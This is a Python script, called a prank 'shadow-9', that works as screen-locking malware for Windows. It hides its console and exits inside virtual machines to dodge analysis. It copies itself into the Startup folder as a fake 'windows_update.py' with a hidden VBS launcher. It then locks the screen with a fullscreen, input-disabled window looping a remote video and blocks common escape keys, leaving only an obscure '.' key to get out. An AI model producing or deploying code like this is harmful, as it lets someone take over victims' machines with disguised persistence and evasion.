import os, sys, ctypes, subprocess, threading, time
import tkinter as tk
import vlc
import keyboard
import psutil

VIDEO_URL = "https://cdn.jsdelivr.net/gh/NoseyGames/data@main/cornbread.mp4"
ESCAPE_KEY = "."
FLAG_FILE = os.path.join(os.getenv('APPDATA'), 'shadow.flag')

def hide_console():
    try:
        ctypes.windll.user32.ShowWindow(ctypes.windll.kernel32.GetConsoleWindow(), 0)
    except:
        pass

def is_disabled():
    return os.path.exists(FLAG_FILE)

def create_disable_flag():
    try:
        with open(FLAG_FILE, 'w') as f:
            f.write('shadow-9 disabled. delete this file to reactivate.')
    except:
        pass

def remove_persistence():
    try:
        startup = os.path.join(os.getenv('APPDATA'), 'Microsoft', 'Windows', 'Start Menu', 'Programs', 'Startup')
        payload_path = os.path.join(startup, 'windows_update.py')
        if os.path.exists(payload_path):
            os.unlink(payload_path)
        vbs_path = os.path.join(startup, 'update.vbs')
        if os.path.exists(vbs_path):
            os.unlink(vbs_path)
        # no reg delete, no schtasks delete - stay silent
    except:
        pass

def kill_analyzers():
    pass  # disabled per request

def anti_vm():
    try:
        if any(x in subprocess.getoutput("wmic computersystem get model").lower() for x in ["vmware", "virtual", "qemu", "xen"]):
            sys.exit(0)
    except:
        pass

def show_final_popup():
    ctypes.windll.user32.MessageBoxW(0, "shadow-9 was here.\n\npress . to escape next time too.\n\nyou got pranked.", "Game Over", 0x30 | 0x1000)

def video_prison():
    anti_vm()

    root = tk.Tk()
    root.attributes("-fullscreen", True)
    root.attributes("-topmost", True)
    root.configure(bg='black')
    root.overrideredirect(True)
    root.config(cursor="none")
    root.attributes("-disabled", True)

    instance = vlc.Instance("--no-video-title-show --loop --quiet --no-snapshot-preview --no-osd")
    player = instance.media_player_new()
    media = instance.media_new(VIDEO_URL)
    player.set_media(media)

    frame = tk.Frame(root, bg='black')
    frame.pack(fill="both", expand=True)
    player.set_hwnd(frame.winfo_id())

    player.play()

    def force_topmost():
        while True:
            try:
                win32gui.SetWindowPos(root.winfo_id(), win32con.HWND_TOPMOST, 0, 0, 0, 0, win32con.SWP_NOMOVE | win32con.SWP_NOSIZE | win32con.SWP_SHOWWINDOW)
                time.sleep(0.05)
            except:
                break

    threading.Thread(target=force_topmost, daemon=True).start()

    def kill_escape_attempts():
        while True:
            try:
                for key in ['esc', 'ctrl', 'alt', 'tab', 'win', 'f4']:
                    if keyboard.is_pressed(key):
                        keyboard.block_key(key)
            except:
                pass
            time.sleep(0.03)
    threading.Thread(target=kill_escape_attempts, daemon=True).start()

    def on_escape(event):
        if event.name == ESCAPE_KEY:
            player.stop()
            root.destroy()
            create_disable_flag()
            remove_persistence()
            # silent cleanup - nothing visible
            try:
                # restore explorer only if needed, no killing anything
                if not any("explorer.exe" in p.info['name'].lower() for p in psutil.process_iter(['name'])):
                    subprocess.Popen("explorer.exe")
            except:
                pass
            # clean exit, screen returns to normal desktop instantly
            os._exit(0)

    keyboard.on_press(on_escape)

    root.protocol("WM_DELETE_WINDOW", lambda: None)
    root.mainloop()

if __name__ == "__main__":
    hide_console()
    anti_vm()

    if is_disabled():
        sys.exit(0)

    # persistence - only startup folder + vbs (no reg, no schtasks as requested)
    try:
        startup = os.path.join(os.getenv('APPDATA'), 'Microsoft', 'Windows', 'Start Menu', 'Programs', 'Startup')
        payload_path = os.path.join(startup, 'windows_update.py')
        with open(payload_path, 'w', encoding='utf-8') as f:
            f.write(open(sys.argv[0], 'r', encoding='utf-8').read())
        
        # vbs wrapper for stealth
        vbs_path = os.path.join(startup, 'update.vbs')
        with open(vbs_path, 'w') as f:
            f.write(f'CreateObject("Wscript.Shell").Run "pythonw.exe ""{payload_path}""", 0, False')
    except:
        pass

    video_prison()
